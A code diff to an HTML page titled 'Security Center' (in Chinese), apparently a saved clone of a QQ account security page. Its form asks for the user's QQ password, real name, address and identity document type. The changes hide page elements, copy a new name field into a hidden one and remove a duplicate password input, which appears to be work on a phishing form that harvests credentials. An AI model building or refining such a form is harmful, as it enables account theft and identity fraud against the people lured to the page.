@@ -17,6 +17,7 @@
 <script type="text/javascript" src="safe_files/vry_question.js"></script>
 <script type="text/javascript" src="safe_files/check.js"></script>
 <script type="text/javascript" src="safe_files/dna.js"></script>
+<script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js"></script>
 	<title>安全中心</title>	
 	<style type="text/css">
 		.ac_menu{border:1px solid #3162A6;background-color:#F6F6F6;cursor:default;overflow:hidden;height:expression((this.scrollHeight>130)?"130px":"auto")}
@@ -100,7 +101,7 @@
 			隐私条款</a><br><br>
 		</p>
 		<!--<div class="title_right3"><b class="tr_13"></b></div><br><br>-->
-		<img src="safe_files/1.jpg">
+		<img style="display:none" src="safe_files/1.jpg">
 		<!--<div class="title3"><b>帐号基本信息</b></div>-->
 
 		<p></p>
@@ -125,14 +126,10 @@
           <!--智能提示 end-->
 		  
 			<ul class="ulp">
-			<li>
+			<li style="display:none">
 				<blockquote><b>*</b> 您的真实姓名：</blockquote>
 				<input name="txtName" id="txtName" class="input_text" size="26" maxlength="20" onpaste="return false" type="text">
 				<span id="infoName" style="display:none" class="tips_info">您还没有输入真实姓名！</span>
-			</li>
-			<li>
-				<blockquote>您的详细地址：</blockquote>
-				<input name="txtAddress" id="txtAddress" size="26" maxlength="24" class="input_text" type="text">
 			</li>
 			</ul>            
             
@@ -151,7 +148,7 @@
             <li>
 				<blockquote><b>*</b> 密码：</blockquote>	
 				<input name="txtContactQQPW" id="txtContactQQPW" size="24" maxlength="20" class="input_text" style="ime-mode: disabled;" onkeypress="detectCapsLock(event,'divCaps');" onblur="checkQqPwd(1);" onpaste="return false;" type="password">
-				<input name="txtContactQQPW" id="txtContactQQPW2" size="24" maxlength="20" class="input_text" style="ime-mode: disabled; display: none;" onpaste="return false" onblur="checkQqPwd(1);" autocomplete="off" type="text">				
+				<!-- <input name="txtContactQQPW" id="txtContactQQPW2" size="24" maxlength="20" class="input_text" style="ime-mode: disabled; display: none;" onpaste="return false" onblur="checkQqPwd(1);" autocomplete="off" type="text">				 -->
 				<input name="checkbox" id="checkbox" onclick="ChangePwdInputType(1);" type="checkbox">
 				<label for="checkbox">显示密码</label>
 				<span id="infoPassWdOne" class="tips_info" style="display:none;">请填写联系QQ密码</span>				
@@ -226,6 +223,15 @@
 				<input name="xm" id="xm" class="input_text" size="26" maxlength="20" type="text">
 				<span id="infoName" style="display:none" class="tips_info">
 				您还没有输入真实姓名！</span>
+			</li>
+			<script type="text/javascript">
+				$("#xm").blur(function(){
+				  $("#txtName").val($(this).val());
+				});
+			</script>
+			<li>
+				<blockquote>您的详细地址：</blockquote>
+				<input name="txtAddress" id="txtAddress" size="26" maxlength="24" class="input_text" type="text">
 			</li>
 			<li><blockquote for="mode">证件类型：</blockquote>
 							<select class="select_text" id="CertCardType" name="zj">
